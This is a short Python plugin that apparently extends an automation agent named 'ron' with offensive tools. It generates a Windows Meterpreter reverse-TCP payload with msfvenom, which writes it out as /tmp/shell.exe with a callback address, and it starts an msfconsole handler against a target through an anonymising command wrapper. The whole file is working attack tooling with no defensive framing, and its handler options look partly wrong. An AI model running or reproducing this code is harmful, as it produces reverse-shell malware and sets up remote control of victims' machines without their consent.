def register(ron):
    def msfvenom(payload="windows/meterpreter/reverse_tcp", lhost="192.168.1.100"):
        cmd = f"msfvenom -p {payload} LHOST={lhost} -f exe > /tmp/shell.exe"
        ron.execute_task(cmd)
        ron.log(f"💉 MSFVenom: {payload} → shell.exe")
    
    def msfconsole(target):
        cmd = f"msfconsole -q -x 'use exploit/multi/handler; set RHOSTS {target}; run'"
        ron.anon.anon_command(cmd)
    
    return {"msfvenom": msfvenom, "msfconsole": msfconsole}
